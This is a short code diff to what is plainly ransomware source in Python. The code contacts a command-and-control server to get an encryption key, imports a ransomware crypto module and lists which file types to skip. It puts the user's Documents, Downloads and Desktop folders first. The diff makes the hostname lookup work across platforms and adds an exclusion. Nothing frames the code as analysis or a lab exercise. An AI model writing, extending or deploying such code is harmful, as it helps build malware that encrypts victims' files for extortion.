@@ -1,8 +1,8 @@
 # get a KEY from the C&C server
 
-import requests, uuid, os
+import requests, uuid, os,socket
 UUID = uuid.uuid4()
-host_name = os.environ['COMPUTERNAME']
+host_name = socket.gethostname()
 encryption_key = ""
 
 # register with C&C server
@@ -19,7 +19,7 @@ while encryption_key == "":
 
 from ransomcrypto import *
 
-excluded_filetypes = ['.enc','.exe', '.bat', '.tar.gz', '.js', '.html', '.py']
+excluded_filetypes = ['.enc','.exe', '.bat', '.tar.gz', '.js', '.html','.py','php']
 
 
 priority_dirs = ['Documents', 'Downloads', 'Desktop'] # would normally do all folders in users home dir
